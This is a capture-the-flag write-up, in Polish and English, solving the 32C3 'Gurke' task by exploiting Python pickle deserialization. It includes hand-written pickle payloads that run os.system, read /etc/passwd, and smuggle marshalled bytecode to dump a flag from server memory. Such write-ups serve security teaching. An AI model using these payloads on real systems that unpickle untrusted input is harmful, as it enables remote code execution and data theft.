##Gurke (Misc, 300p)

###PL
[ENG](#eng-version)

Na serwerze działa [skrypt](gurke.py) który odbiera od nas wiadomość a następnie deserializuje ją za pomocą pickle. 
Z kodu wynika, że w pamięci wczytana jest flaga pobrana z socketu a my mamy dość spore ograniczenia jeśli chodzi o wołanie funkcji kernela.

Pickle pozwala na bardzo nietypowy sposób deserializacji obiektów - możemy w danej klasie nadpisać metodę `__reduce__()` i zwrócić z niej krotkę zawierającą:

- funkcję

- krotkę z parametrami dla tej funkcji

A pickle podczas deserializacji obiektu tej klasy wywoła podaną funkcję z tymi parametrami.

To oznacza, że teoretycznie możemy wykonać dowolną funkcję z dowolnymi parametrami po stronie serwera. W szczególności moglibyśmy wykonać na przykład `os.system("command")`! Pickle jako takie ma zaimplementowane pewne zabezpieczenia, które nie pozwalają na serializację obiektów z pewnymi funkcjami, niemniej format pickle jest na tyle prosty, że możemy napisać go ręcznie.

Pickle wykonujący powyższe wywołanie `os.system("ls")` wyglądałby tak: 

```
cos
system
(S'ls'
tR.
```

Pickle wykonuje podany przez nas kod jako maszyna ze stosem. Powyższy kod jest interpretowany jako:

`cos\nsystem` - połóż na stosie funkcje `system` importowaną z modułu `os`

`(` - połóż na stosie marker

`S'ls'` - połóż na stosie stringa `ls`

`t` - pobierz ze stosu wszystko aż do najbliższego markera, zrób z tego krotkę i połóż ją na stosie

`R` - pobierz ze stosu dwa elementy, pierwszy potraktuj jako argumenty a drugi jako funkcję którą należy z nimi wywołać, połóż na stosie wynik funkcji

Dodatkowe operacje, które będą nam w tym zadaniu potrzebne to:

`I123` - połóż na stosie integera o wartości 123

`)` - połóż na stosie pustą krotkę

`d` - pobierz ze stosu wszystko do markera i zbuduj z tego słownik

Znaki nowej linii są konieczne! Możemy oczywiście składać wywołania funkcji kaskadowo i na przykład wywołanie 

`os.write(1, subprocess.check_output("cat /etc/passwd"))` 

możemy wysłać jako: 

```
cos
write
(I1
csubprocess
check_output
(S'cat /etc/passwd'
tRtR.
```

Potrafimy więc wykonywać niemalże dowolny kod na zdalnej maszynie, o ile funkcja którą chcemy wywołać jest tam dostępna. Teraz czas zastanowić się jak użyć tego do uzyskania samej flagi. Flagę można odczytać przez socket, ale takiej możliwości nie mamy ze względu na ograniczenia nałożne na skrypt. Pozostaje nam jedynie wyciągnięcie flagi, która jest wczytana do pamięci programu działającego na serwerze.

Wykorzystamy do tego dostępny na serwerze pakiet `inspect`. Pozwala on między innymi na operacje `inspect.currentframe()`, `inspect.getouterframes()` oraz `inspect.getmembers()`. Pierwsza funkcja zwraca aktualną ramkę stosu. Druga zwraca listę informacji o ramkach stosu, które są wyżej od naszej (w tym same ramki). Trzecia zwraca dane wyciągnięte z podanej ramki stosu. Chcemy wykonać kaskadę `inspect.getouterframes(inspect.currentframe())` która zwróci nam listę informacji na temat ramek powyżej naszej, czyli w szczególności także ramkę w której znajduje się poszukiwana przez nas flaga. Wypisując na ekran kolejne elementy tej listy możemy odczytać że interesująca nas ramka jest 3 elementem listy, a sama ramka jest pierwszym elementem krotki. Więc dostęp do ramki wymaga: 

```python
current_frame = inspect.currentframe()
outer_frames = inspect.getouterframes(current_frame)
frame_with_flag = outer_frames[3][0]
```

Lub zapisanego zwięźlej `inspect.getouterframes(inspect.currentframe())[3][0]`

Następnie używamy funkcji `inspect.getmembers()` do pobrania informacji o ramce, gdzie znajdują się też wartości zmiennych globalnych w tej ramce, w tym naszej flagi. Serwer przycina informacje które dostajemy więc musimy lokalnie policzyć gdzie dokładnie znajduje się flaga. Okazuje się, że z wyniku `getmembers` potrzebujemy pobrać 6 od końca element zwróconej listy, z niego pobrać element o indeksie 1 i uzyskamy w ten sposób słownik zmiennych globalnych. Flaga nazywa się `flag` i jest obiektem klasy, który ma pole `flag`. Potrzebujemy więc:

```python
framedata = inspect.getmembers(frame_with_flag)
flag_value = framedata[-6][1]['flag'].flag
```

Potrzebujemy więc kaskadowego wywołania: `os.write(1,inspect.getmembers(inspect.getouterframes(inspect.currentframe())[3][0])[-6][1]['flag'].flag)`

Pojawia się jednak problem - operacje indeksowania list oraz pobierania elementu słownika nie są dla nas dostępne w postaci funkcji (ponieważ na przykład pakiet `list` nie jest importowany po stronie serwera). Na szczęście na serwerze dostępne są jeszcze pakiety `marshal`, `types` oraz `base64`. Możemy dzięki nim dokonać serializacji oraz deserializacji bajtkodu funkcji napisanej w pythonie. Możemy zamienić funkcje na stringa a potem z tego stringa odtworzyć funkcję, którą nadal da się wywołać!

```python
import base64
import marshal
import types


def fun(arg):
    print('test ' + arg)

marshaled_bytecode = marshal.dumps(fun.func_code)
printable_string = base64.b64encode(marshaled_bytecode)
print(printable_string)
decoded_bytecode = base64.b64decode(printable_string)
recovered_code = marshal.loads(decoded_bytecode)
callable_function = types.FunctionType(recovered_code, {}, "")
callable_function("argument")
```

Powyższy kod prezentuje jak można zbudować stringa z "funkcją" a następnie jak tą funkcję odtworzyć. Nie trudno zauważyć, że odtworzenie funkcji to kaskada: 

`types.FunctionType(marshal.loads(base64.b64decode("base64 code")),{},"")`

I taką operację możemy zapisać prosto w postaci pickle:

```
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'base64 code'
tRtR(dS''
))tR
```

I w ten sposób na stosie znajdzie się nasza własna funkcja.

Możemy w ten sposób przygotować funkcje z brakującymi operacjami `frames[3][0]` oraz `frame_data[-6][1]['flag'].flag`, stworzyć z nich stringi base64 a następnie w pickle umieścić kod deserializujący te funkcje. Finalnie rozwiązanie dla tego zadania to (cały solver dostępny [tutaj](solver.py)):

```python
def fun1(frames):
    return frames[3][0]


def fun2(frames_data):
    return frames_data[-6][1]['flag'].flag

code1 = base64.b64encode(marshal.dumps(fun1.func_code))
code2 = base64.b64encode(marshal.dumps(fun2.func_code))

class Flag(object):
    pass

data = "cos\nwrite\n(I1\nctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'"+code2+"'\ntRtR(dS''\n))tR(cinspect\ngetmembers\n(ctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'"+code1+"'\ntRtR(dS''\n(t(ttR(cinspect\ngetouterframes\n(cinspect\ncurrentframe\n)RtRtRtRtRtR."
```

Co daje nam pickle:

```
cos
write
(I1
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwEAAAABAAAAAgAAAEMAAABzEwAAAHwAAGQBABlkAgAZZAMAGWoAAFMoBAAAAE5p+v///2kBAAAAdAQAAABmbGFnKAEAAABSAAAAACgBAAAAdAsAAABmcmFtZXNfZGF0YSgAAAAAKAAAAABzRAAAAEM6L1VzZXJzL1BoYXJpc2FldXMvUHljaGFybVByb2plY3RzL3VudGl0bGVkL3NyYy8zMmMzL2d1cmtlL2d1cmtlLnB5dAQAAABmdW4yEAAAAHMCAAAAAAE='
tRtR(dS''
))tR(cinspect
getmembers
(ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwEAAAABAAAAAgAAAEMAAABzDAAAAHwAAGQBABlkAgAZUygDAAAATmkDAAAAaQAAAAAoAAAAACgBAAAAdAYAAABmcmFtZXMoAAAAACgAAAAAc0QAAABDOi9Vc2Vycy9QaGFyaXNhZXVzL1B5Y2hhcm1Qcm9qZWN0cy91bnRpdGxlZC9zcmMvMzJjMy9ndXJrZS9ndXJrZS5weXQEAAAAZnVuMQwAAABzAgAAAAAB'
tRtR(dS''
(t(ttR(cinspect
getouterframes
(cinspect
currentframe
)RtRtRtRtRtR.
```

Wysłanie tak utworzonego kodu zwraca nam z serwera flagę `32c3_rooDahPaeR3JaibahYeigoong`

Dla zainteresowanych, obszerny opis zastosowanej techniki exploitowania pickle: https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf

### ENG version

There is a [script](gurke.py) running on the server, which takes an input we send and deserializes it with pickle.
From the code we can see, that the flag is collected via socket and that we are constrained in terms of kernel functions we can use.

Pickle allows a very unusual deserialization option - we can write a function `__reduce__()` in a class, and from this function return a tuple with:

- function

- tuple with parameters for this function

Pickle when deserializing such object will call given function with those parameters.

This means that we can, theoretically, call any function with any set of parmeters on the server side. In particular, we could call for example `os.system("command")`!
Pickle has some internal security which prevents from using some functions, however the format of pickle output is so simple that we can just write it by hand.

Pickle calling `os.system("ls")` can look like this:

```
cos
system
(S'ls'
tR.
```

Pickle executes this on a stack machine. The code above is interpreted as:

`cos\nsystem` - push function `system` imported from module `os` on the stack

`(` - push a marker on the stack

`S'ls'` - push a string `ls` on the stack

`t` - pop everything from the stack until a marker is reached, put all those elements in a tuple and push this tuple to the stack

`R` - pop two elements from the stack, first one is arguments tuple and the second one is a function that should be called with those arguments, push result of the function on the stack

Additional operations we will use to solve this task:

`I123` - push an integer 123 ono the stack

`)` - push empty tuple on the stack

`d` - pop everyting from the stack until maker is reached, push a dictionary built with the values poped

The newline characters in the code are necessary! We can, of course, do cascade function calls, for example:

`os.write(1, subprocess.check_output("cat /etc/passwd"))` 

can be written as:

```
cos
write
(I1
csubprocess
check_output
(S'cat /etc/passwd'
tRtR.
```

We can call pretty much any code on the remote machine, as long as the function exists on the target machine. Now we need to figure out how exactly we can get the flag.
We could read the flag from the socket, just as server code does, however this is restricted by kernel functions block. Therefore, we need to get the flag from memory of the server script.

We will use the `inspect` package which is available on the server. Is allows us to use `inspect.currentframe()`, `inspect.getouterframes()` and `inspect.getmembers()`.
First one returns current stack frame. Second returns list of information on the stack frames above our frame (including the frame itself, line of code, script path etc).
The third one returns data extracted from the given frame.
We want to call a cascade `inspect.getouterframes(inspect.currentframe())` to get list of frames informations regarding frames above our current frame, and in particular there will be a frame with server code which contains a loaded `flag`. By printing elements of this list we can find out that the frame we are interested in is a third element of the list, and the frame itself is the first element of tuple. So we need:

```python
current_frame = inspect.currentframe()
outer_frames = inspect.getouterframes(current_frame)
frame_with_flag = outer_frames[3][0]
```

Or written shorter: `inspect.getouterframes(inspect.currentframe())[3][0]`

Next we use `inspect.getmembers()` to get informations about the frame, where we can find also global variables in this frame, including our flag.
Server limits the output we can get so we need to test this locally to dig into the returned structure and find where the flag will be. We figure out that from `getmemebers` call we need 6th element from the end of the list, from this we need element of index 1 and we should get a dictionary of global variables. The flag variable is called `flag` and is an object of a class with field `flag`. So we need:

```python
framedata = inspect.getmembers(frame_with_flag)
flag_value = framedata[-6][1]['flag'].flag
```

So a short cascade: `os.write(1,inspect.getmembers(inspect.getouterframes(inspect.currentframe())[3][0])[-6][1]['flag'].flag)`

We bump into a complication - the list indexing and taking a dictionary value by key are not available to us (because for example `list` module is not imported on the server). 
However there are `marshal`, `types` and `base64` availble. We can use them to serialize and deserialize bytecode of a python function.
We can make a printable string from a function and then recreate this function from string, and call it!

```python
import base64
import marshal
import types


def fun(arg):
    print('test ' + arg)

marshaled_bytecode = marshal.dumps(fun.func_code)
printable_string = base64.b64encode(marshaled_bytecode)
print(printable_string)
decoded_bytecode = base64.b64decode(printable_string)
recovered_code = marshal.loads(decoded_bytecode)
callable_function = types.FunctionType(recovered_code, {}, "")
callable_function("argument")
```

Code above presnts how we can make a printable string with a "function" and then how to recreate it. It's easy to see that this requires a cascade:

`types.FunctionType(marshal.loads(base64.b64decode("base64 code")),{},"")`

The reason for all those cascades I wrote is because they can be written as pickle very easily:

```
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'base64 code'
tRtR(dS''
))tR
```

When we deserialize this with pickle on the stack there will be our own function passed as string.

We can use this technique and create functions with missing `frames[3][0]` and `frame_data[-6][1]['flag'].flag` operations, make a base64 printable string from them and then place a deserialize code in pickle. The final solution for this task was (whole solver available [here](solver.py)):


```python
def fun1(frames):
    return frames[3][0]


def fun2(frames_data):
    return frames_data[-6][1]['flag'].flag

code1 = base64.b64encode(marshal.dumps(fun1.func_code))
code2 = base64.b64encode(marshal.dumps(fun2.func_code))

class Flag(object):
    pass

data = "cos\nwrite\n(I1\nctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'"+code2+"'\ntRtR(dS''\n))tR(cinspect\ngetmembers\n(ctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'"+code1+"'\ntRtR(dS''\n(t(ttR(cinspect\ngetouterframes\n(cinspect\ncurrentframe\n)RtRtRtRtRtR."
```

Which gives us a pickle:

```
cos
write
(I1
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwEAAAABAAAAAgAAAEMAAABzEwAAAHwAAGQBABlkAgAZZAMAGWoAAFMoBAAAAE5p+v///2kBAAAAdAQAAABmbGFnKAEAAABSAAAAACgBAAAAdAsAAABmcmFtZXNfZGF0YSgAAAAAKAAAAABzRAAAAEM6L1VzZXJzL1BoYXJpc2FldXMvUHljaGFybVByb2plY3RzL3VudGl0bGVkL3NyYy8zMmMzL2d1cmtlL2d1cmtlLnB5dAQAAABmdW4yEAAAAHMCAAAAAAE='
tRtR(dS''
))tR(cinspect
getmembers
(ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwEAAAABAAAAAgAAAEMAAABzDAAAAHwAAGQBABlkAgAZUygDAAAATmkDAAAAaQAAAAAoAAAAACgBAAAAdAYAAABmcmFtZXMoAAAAACgAAAAAc0QAAABDOi9Vc2Vycy9QaGFyaXNhZXVzL1B5Y2hhcm1Qcm9qZWN0cy91bnRpdGxlZC9zcmMvMzJjMy9ndXJrZS9ndXJrZS5weXQEAAAAZnVuMQwAAABzAgAAAAAB'
tRtR(dS''
(t(ttR(cinspect
getouterframes
(cinspect
currentframe
)RtRtRtRtRtR.
```

And sending it to the server we get the flag: `32c3_rooDahPaeR3JaibahYeigoong`

If you're interested in some more details on pickle exploiting (and some more info on the stack language) read: https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf